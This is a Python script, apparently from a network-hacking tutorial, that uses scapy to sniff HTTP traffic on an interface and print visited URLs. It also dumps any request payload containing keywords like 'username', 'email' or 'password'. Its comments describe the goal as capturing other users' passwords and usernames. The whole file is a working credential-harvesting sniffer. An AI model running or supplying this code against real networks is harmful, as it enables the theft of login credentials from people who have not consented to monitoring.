#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http    # here we have imported the http package from the scapy module


def sniff(interface):
    scapy.sniff(iface = interface, store = False, prn = process_sniffed_packet)

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        print(packet.show())
        # here this is we are doing because we to see the layer of the url or in the simple words in which layer they do keep the urls
        # so it has been found that the url exists in the two part and present in the [HTTP Request] and it is present in the two fields for eg we are loading some pages,images etc on any website then the website url or the domain name can be found in the Host field and the after the domain stuff can be find in the Path field
        # now we know we can access the layer by [] and the fields by . in the packets
        # here we can't use the scapy.Raw because it is of the http layer so here we will use the http rather than scapy
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print(url)
        if packet.haslayer(scapy.Raw):
           
            load = packet[scapy.Raw].load
            keywords = ['username', 'user', 'email', 'e-mail', "Email", "pass", "password", "login"]
            for keyword in keywords:
                if keyword in load:
                    print(load)
                    break

sniff("eth0")

#here we succesfully accqiure the user passwords and the username now we want also the url of the users so let's see how we can see the url of the user
